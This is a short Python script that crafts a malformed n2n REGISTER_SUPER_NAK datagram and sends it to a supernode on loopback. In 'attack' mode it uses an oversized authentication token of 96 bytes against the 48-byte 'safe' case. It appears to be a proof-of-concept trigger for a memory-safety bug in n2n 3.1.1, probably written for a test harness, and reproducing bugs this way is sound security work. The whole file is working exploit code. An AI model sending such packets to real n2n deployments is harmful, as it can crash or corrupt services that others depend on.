#!/usr/bin/env python3
"""Send one crafted REGISTER_SUPER_NAK datagram to a loopback n2n supernode.

Wire layout (pinned n2n 3.1.1 wire.c):
  common: version(1) ttl(1) flags(2,BE) community(20)
  NAK:    cookie(4,BE) srcMac(6) auth.scheme(2,BE) auth.token_size(2,BE) token(token_size)
"""
import socket
import struct
import sys

PORT = int(sys.argv[1])
MODE = sys.argv[2]  # "safe" or "attack"

COMMUNITY = b"mynetwork".ljust(20, b"\0")
COOKIE = 0x11223344
MAC = bytes([0x02, 0x00, 0x00, 0x00, 0x00, 0x01])
SCHEME = 0

token_size = 48 if MODE == "safe" else 96
# Chosen repeating pattern; first four bytes are 48 5a 4d 49 as in harness.
token = bytes([0x48, 0x5a, 0x4d, 0x49]) * (token_size // 4)

pkt = (bytes([3, 3]) + struct.pack("!H", 8) + COMMUNITY
       + struct.pack("!I", COOKIE) + MAC
       + struct.pack("!H", SCHEME) + struct.pack("!H", token_size) + token)
assert len(pkt) == 38 + token_size, len(pkt)
assert pkt[23] == 0 and pkt[0] == 3

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(pkt, ("127.0.0.1", PORT))
s.close()
print(f"sent {MODE} NAK: len={len(pkt)} token_size={token_size} "
      f"token[0:4]={token[:4].hex()}")
